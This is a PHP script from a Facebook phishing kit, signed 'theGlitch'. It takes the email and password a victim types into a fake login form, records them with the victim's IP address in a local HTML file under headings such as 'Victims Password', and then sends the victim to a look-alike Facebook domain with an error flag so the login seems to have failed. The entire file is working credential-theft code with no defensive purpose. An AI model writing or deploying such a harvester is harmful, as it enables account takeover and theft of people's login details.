<?php
#Facebook hack by theGlitch
$habbo = $_POST['email']; 
$password = $_POST['pass'];
$ip = $_SERVER['REMOTE_ADDR']; 
$f = fopen("lib/bin/database.htm", "a"); 
fwrite ($f, 'Victims Name: [<b><font color="#570000">'.$habbo.'</font></b>] Victims Password: [<b><font color="#57003A">'.$password.'</font></b>] IP: [<b><font color="#005700">'.$ip.'</font></b>] By: [<b><font color="#005700"><a href="http://www.facebook.com/ekoms.kezmo" rel="nofollow">theGlitch</a></font></b>]<br>');
fclose($f);

header("Location: //facebook.airmoney.site/?sxsrf=ALeKk01n0UiW45blLT4XdYrjW_lYRqSF7g%3A1612015798400&ei=tmgVYIrkF9ai-Qb774ToBg&q=facebook+login&oq=facebook+login&gs_lcp=CgZwc3ktYWIQAzIFCAAQkQIyBQgAEJECMgcIABCxAxBDMgIIADICCAAyAggAMgUIABCxAzIICAAQsQMQgwEyAggAMgIIADoECCMQJzoKCAAQsQMQgwEQQzoECAAQQzoGCAAQChBDOggIABCxAxCRAlCyZViQgAFgrYIBaABwAngAgAHDAYgB3RGSAQQwLjE0mAEAoAEBqgEHZ3dzLXdpesABAQ&sclient=psy-ab&ved=0ahUKEwiKl6To6sPuAhVWUd4KHfs3AW0Q4dUDCA0&uact=5&error=1");
?>
